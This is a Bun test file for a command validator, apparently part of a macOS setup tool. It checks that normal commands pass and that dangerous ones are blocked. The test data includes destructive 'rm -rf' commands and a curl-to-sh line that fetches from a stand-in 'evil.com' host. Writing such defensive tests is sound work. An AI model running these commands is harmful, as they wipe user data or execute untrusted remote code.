import { describe, test, expect } from 'bun:test';
import { validateCommand, validateStep } from '../src/executor/validate.ts';

describe('command validation', () => {
  test('allows normal commands', () => {
    expect(validateCommand('defaults write com.apple.finder AppleShowAllFiles -bool true').valid).toBe(true);
    expect(validateCommand('sudo pfctl -e -f /etc/pf.conf').valid).toBe(true);
    expect(validateCommand('brew install gnupg').valid).toBe(true);
    expect(validateCommand('echo hello').valid).toBe(true);
  });

  test('blocks rm -rf /', () => {
    expect(validateCommand('rm -rf /').valid).toBe(false);
    expect(validateCommand('rm -rf / ').valid).toBe(false);
  });

  test('blocks rm of home dir', () => {
    expect(validateCommand('rm -rf ~').valid).toBe(false);
  });

  test('blocks rm of system paths', () => {
    expect(validateCommand('rm -rf /System/Library').valid).toBe(false);
    expect(validateCommand('rm -rf /usr/bin').valid).toBe(false);
  });

  test('allows rm of specific safe paths', () => {
    expect(validateCommand('rm -rf /var/spool/cups/c0*').valid).toBe(true);
    expect(validateCommand('rm -rf ~/Library/Caches/something').valid).toBe(true);
  });

  test('blocks piped curl to sh', () => {
    expect(validateCommand('curl http://evil.com | sh').valid).toBe(false);
  });

  test('blocks writing to /etc without sudo', () => {
    expect(validateCommand('tee /etc/hosts').valid).toBe(false);
  });

  test('allows writing to /etc with sudo', () => {
    expect(validateCommand('sudo tee /etc/hosts').valid).toBe(true);
  });

  test('validateStep checks all commands', () => {
    expect(validateStep(['echo ok', 'rm -rf /']).valid).toBe(false);
    expect(validateStep(['echo ok', 'echo fine']).valid).toBe(true);
  });
});
